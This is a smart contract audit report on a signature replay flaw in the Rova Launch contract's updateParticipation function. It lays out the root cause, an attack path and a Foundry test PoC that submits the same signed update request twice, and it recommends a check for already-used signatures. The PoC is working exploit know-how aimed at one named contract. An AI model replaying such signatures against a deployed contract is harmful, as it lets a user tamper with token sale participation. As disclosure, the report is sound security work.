# User(Malicious user) can replay `newLaunchParticipationId` in `Launch::updateParticipation`.

### Summary

The function `Launch::updateParticipation` allows update requested token amount for existing participation using the request generated by Rova contract, provided that the `finalizesAtParticipation` is false and `endsAt` has not passed. However, if a malicious user can used this request/Signature again since there is no check it has been previously used. This happens when the malicious user calls `Launch::updateParticipation` twices.

### Root Cause

There is no check if the `newLaunchParticipationId` has been previously used.

### Internal Pre-conditions

1. User(Malicious user) calls `Launch::participate` to participate in token sale using the request generated by Rova backend.
2. The User(Malicious user) calls `Launch::updateParticipation` to update his requested token amount for existing participation using the request generated by Rova backend, provided the `finalizesAtParticipation` is false and `endsAt` has not passed.
3. If `endsAt` has not passed, the User(Malicious user) calls `Launch::updateParticipation` again using the same request generated by Rova backend since there is no check if the request is still valid.

### External Pre-conditions

None

### Attack Path

1. User(Malicious user) calls `Launch::participate` to participate in a `ACTIVE` in a launch group using the request generated by Rova backend.
2. The User(Malicious user) calls `Launch::updateParticipation` to update his requested token amount for existing participation using the request generated by Rova backend, provided the `finalizesAtParticipation` is false and `endsAt` has not passed.
3. If `endsAt` has not passed, the User(Malicious user) calls `Launch::updateParticipation` again using the same request generated by Rova backend since there is no check if the request is still valid.

### Impact

Malicious User can potentially use the same signature multiple times to update participation before the request requestExpiresAt is reached.

### PoC

Make the following changes

1. Edit the amount transsferred to `user1` to `5000 * 10 ** launch.tokenDecimals()` in `LaunchTestBase::_setUpLaunch`

2. Edit `maxTokenAmountPerUser` in `LaunchTestBase::_setupLaunchGroupWithStatus` to `5000 * 10 ** launch.tokenDecimals()`

Paste the following code snippet in `LaunchUpdateParticipationTest`

```javascript
    function test_UpdateParticipation_CanReplay() public {
        // Prepare update participation request
        UpdateParticipationRequest memory updateRequest = _createUpdateParticipationRequest(2000);
        bytes memory updateSignature = _signRequest(abi.encode(updateRequest));

        vm.startPrank(user1);
        uint256 updatedCurrencyAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurrencyAmount);

        // Expect ParticipationUpdated event
        vm.expectEmit();
        emit ParticipationUpdated(
            updateRequest.launchGroupId,
            updateRequest.newLaunchParticipationId,
            testUserId,
            user1,
            updateRequest.tokenAmount,
            address(currency)
        );

        // Update participation
        launch.updateParticipation(updateRequest, updateSignature);

        // Verify update
        ParticipationInfo memory newInfo = launch.getParticipationInfo(updateRequest.newLaunchParticipationId);
        _verifyParticipationInfo(newInfo, updateRequest);

        vm.stopPrank();

        vm.startPrank(user1);
        uint256 updatedCurrAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurrAmount);

        launch.updateParticipation(updateRequest, updateSignature);
        vm.stopPrank();
    }
```

### Mitigation

Enforce a check if the signature has been used before the actual update is done just as done in https://github.com/dpm-labs/rova-contracts/blob/b03e4ede50488a2000bb73d602e28ee4f6c0941f/src/Launch.sol#L237
